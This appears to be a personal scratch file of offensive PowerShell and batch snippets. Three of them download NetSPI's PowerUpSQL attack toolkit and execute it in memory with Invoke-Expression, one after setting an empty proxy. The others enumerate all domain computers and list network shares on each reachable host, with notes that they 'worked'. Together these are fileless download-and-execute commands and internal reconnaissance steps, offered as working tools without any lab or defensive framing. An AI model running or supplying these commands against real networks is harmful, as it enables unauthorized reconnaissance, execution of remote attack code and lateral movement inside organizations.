$url = "https://raw.githubusercontent.com/NetSPI/PowerUpSQL/refs/heads/master/PowerUpSQL.ps1"
$request = [System.Net.HttpWebRequest]::Create($url)
$request.Method = "GET"
$response = $request.GetResponse()
$reader = New-Object IO.StreamReader $response.GetResponseStream()
$scriptContent = $reader.ReadToEnd()
$reader.Close()
Invoke-Expression $scriptContent




$url = "https://raw.githubusercontent.com/NetSPI/PowerUpSQL/refs/heads/master/PowerUpSQL.ps1"
$wc = New-Object System.Net.WebClient
$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()
$scriptBytes = $wc.DownloadData($url)
$scriptContent = [System.Text.Encoding]::UTF8.GetString($scriptBytes)
Invoke-Expression $scriptContent



@echo off
setlocal

:: Get the list of domain computers and save it to a file
net group "domain computers" /domain > computers.txt

:: Filter only computer names (ignores headers and footers in the output)
for /f "tokens=1 delims=" %%A in ('findstr /R /C:"\\\\" computers.txt') do (
    echo Enumerating shares on %%A
    :: Run net view to list shared resources on each computer
    net view %%A >> shares.txt 2>&1
)

:: Clean up temporary files
del computers.txt

echo Network share enumeration completed. Check shares.txt for results.



$url = "https://raw.githubusercontent.com/NetSPI/PowerUpSQL/refs/heads/master/PowerUpSQL.ps1"
$request = [System.Net.WebRequest]::Create($url)
$request.Method = "GET"
$response = $request.GetResponse()
$stream = $response.GetResponseStream()
$reader = New-Object System.IO.StreamReader($stream)
$scriptContent = $reader.ReadToEnd()
$reader.Close()
Invoke-Expression $scriptContent






@echo off
setlocal

:: Get the list of domain computers and save it to a file
net group "domain computers" /domain > computers_raw.txt

:: Filter only computer names and save to another file (ignoring headers/footers)
findstr /R /C:"\\\\" computers_raw.txt > computers.txt
del computers_raw.txt

:: Create or clear output files
echo Network share enumeration results: > shares.txt
echo Unreachable computers: > unreachable.txt

:: Loop through each computer name and check its online status before enumerating
for /f "tokens=1 delims=" %%A in (computers.txt) do (
    echo Checking %%A ...
    
    :: Ping to check if the computer is online
    ping -n 1 %%A | find "TTL=" >nul
    if %errorlevel% equ 0 (
        echo Enumerating shares on %%A ...
        net view %%A >> shares.txt 2>&1
    ) else (
        echo %%A is unreachable. >> unreachable.txt
    )
)

:: Clean up temporary file
del computers.txt

echo Network share enumeration completed.
echo Check shares.txt for successful enumerations and unreachable.txt for errors.




---------------------------------------------------------------------------------
# Run the command and capture the output
$computers = net group "domain computers" /domain

# Filter only the computer names (ignoring headers and footers) and format them line-by-line
$computers | ForEach-Object {
    if ($_ -match "\\\\") { $_.Trim() }
} | Out-File -FilePath "computers_list.txt"

Write-Output "Computer names have been saved line-by-line in computers_list.txt"





---------------------------------------------------------------------------------

# Run the command and capture the output
$computers = net group "domain computers" /domain

# Initialize an array to store the filtered computer names
$computerNames = @()

# Loop through each line and check if it contains a computer name
$startAdding = $false
foreach ($line in $computers) {
    # Skip the header until we find actual computer entries
    if ($line -match "^-+$") { 
        $startAdding = $true
        continue
    }
    # Stop adding when we hit the footer
    if ($line -match "The command completed successfully.") { break }

    # If we are in the section with computer names, add them to the array
    if ($startAdding -and $line.Trim() -ne "") {
        $computerNames += $line.Trim()
    }
}

# Output the result to a file, each computer on a new line
$computerNames | Out-File -FilePath "computers_list.txt"

Write-Output "Computer names have been saved line-by-line in computers_list.txt"



THis WORKED! - Oct -28-2024 ---------------------------------------------------------------------------------

# Run the command and capture the output
$computers = net group "domain computers" /domain

# Initialize an array to store the formatted computer names
$computerNames = @()

# Loop through each line and extract individual computer names
$startAdding = $false
foreach ($line in $computers) {
    # Start adding after finding the dashed separator line
    if ($line -match "^-+$") { 
        $startAdding = $true
        continue
    }
    # Stop adding at the footer line
    if ($line -match "The command completed successfully.") { break }

    # If we are in the computer names section, split each line by whitespace and add each name individually
    if ($startAdding -and $line.Trim() -ne "") {
        $line.Split(" ", [System.StringSplitOptions]::RemoveEmptyEntries) | ForEach-Object {
            $computerNames += $_
        }
    }
}

# Output the result to a file, each computer on a new line
$computerNames | Out-File -FilePath "computers_list.txt"

Write-Output "Computer names have been saved line-by-line in computers_list.txt"


THis WORKED! - Oct -28-2024 ---------------------------------------------------------------------------------

# Specify the path to the file with the list of computers
$computerListPath = "computers_list.txt"

# Check if the file exists
if (-Not (Test-Path -Path $computerListPath)) {
    Write-Output "Computer list file not found at $computerListPath"
    exit
}

# Output file for network shares
$outputFile = "network_shares.txt"
$unreachableFile = "unreachable_computers.txt"

# Clear previous results, if any
Clear-Content -Path $outputFile -ErrorAction SilentlyContinue
Clear-Content -Path $unreachableFile -ErrorAction SilentlyContinue

# Loop through each computer in the list
foreach ($computer in Get-Content -Path $computerListPath) {
    Write-Output "Checking $computer..."

    # Test if the computer is reachable
    if (Test-Connection -ComputerName $computer -Count 1 -Quiet) {
        Write-Output "Enumerating shares on $computer..."

        # Enumerate shares using Get-WmiObject
        try {
            $shares = Get-WmiObject -Class Win32_Share -ComputerName $computer -ErrorAction Stop
            if ($shares) {
                # Append results to the output file
                Add-Content -Path $outputFile -Value "Shares on $computer:"
                foreach ($share in $shares) {
                    Add-Content -Path $outputFile -Value "  Share Name: $($share.Name), Path: $($share.Path)"
                }
                Add-Content -Path $outputFile -Value "-----------------------------------"
            } else {
                Add-Content -Path $outputFile -Value "No shares found on $computer"
            }
        } catch {
            # Log any errors (e.g., access denied) to the output file
            Add-Content -Path $outputFile -Value "Error accessing shares on $computer: $_"
        }
    } else {
        Write-Output "$computer is unreachable."
        Add-Content -Path $unreachableFile -Value $computer
    }
}

Write-Output "Network share enumeration completed."
Write-Output "Results are saved in $outputFile. Unreachable computers are listed in $unreachableFile."

